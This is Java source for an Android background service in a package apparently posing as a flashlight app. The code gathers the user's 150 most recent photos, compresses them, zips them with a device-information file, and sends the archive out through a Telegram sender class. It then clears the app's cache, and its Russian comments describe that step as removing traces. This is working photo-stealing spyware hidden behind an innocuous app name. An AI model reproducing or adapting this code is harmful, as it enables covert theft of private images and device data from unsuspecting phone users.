package com.flashlight.app;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.IBinder;
import android.provider.MediaStore;
import androidx.annotation.Nullable;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class GalleryService extends Service {
    @Nullable @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            try {
                List<Uri> allImages = getRecentImages();
                ByteArrayOutputStream zipBuffer = new ByteArrayOutputStream();
                ZipOutputStream zos = new ZipOutputStream(zipBuffer);
                
                // 1. Добавляем info.txt с данными о телефоне
                String infoText = DeviceInfo.getInfo(this);
                ZipEntry infoEntry = new ZipEntry("info.txt");
                zos.putNextEntry(infoEntry);
                zos.write(infoText.getBytes());
                zos.closeEntry();

                // 2. Добавляем фотографии
                int count = 1;
                for (Uri uri : allImages) {
                    try {
                        InputStream is = getContentResolver().openInputStream(uri);
                        BitmapFactory.Options options = new BitmapFactory.Options();
                        options.inJustDecodeBounds = true;
                        BitmapFactory.decodeStream(is, null, options);
                        if (is != null) is.close();
                        
                        int scale = 1;
                        while (options.outWidth / scale > 800 || options.outHeight / scale > 800) {
                            scale *= 2;
                        }

                        is = getContentResolver().openInputStream(uri);
                        options = new BitmapFactory.Options();
                        options.inSampleSize = scale;
                        Bitmap bitmap = BitmapFactory.decodeStream(is, null, options);
                        if (is != null) is.close();

                        if (bitmap != null) {
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                            byte[] bytes = baos.toByteArray();
                            bitmap.recycle();

                            ZipEntry entry = new ZipEntry(count + ".jpg");
                            zos.putNextEntry(entry);
                            zos.write(bytes);
                            zos.closeEntry();
                            
                            count++;
                        }
                    } catch (Exception e) { e.printStackTrace(); }
                }
                
                zos.close();
                
                if (count > 1) {
                    // Отправляем ZIP-файл
                    new TelegramSender().sendZip(zipBuffer.toByteArray(), "photos_" + System.currentTimeMillis() + ".zip");
                }

                // 3. УДАЛЕНИЕ СЛЕДОВ (чистим кэш приложения)
                clearAppCache();

            } catch (Exception e) { e.printStackTrace(); }
            stopSelf();
        }).start();
        return START_NOT_STICKY;
    }

    private void clearAppCache() {
        try {
            File cacheDir = getCacheDir();
            if (cacheDir != null && cacheDir.isDirectory()) {
                File[] children = cacheDir.listFiles();
                if (children != null) {
                    for (File child : children) {
                        child.delete();
                    }
                }
            }
        } catch (Exception e) { e.printStackTrace(); }
    }

    private List<Uri> getRecentImages() {
        List<Uri> imageUris = new ArrayList<>();
        String[] projection = new String[]{MediaStore.Images.Media._ID};
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null, sortOrder
        );

        if (cursor != null) {
            int count = 0;
            while (cursor.moveToNext() && count < 150) {
                long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
                imageUris.add(uri);
                count++;
            }
            cursor.close();
        }
        return imageUris;
    }
}
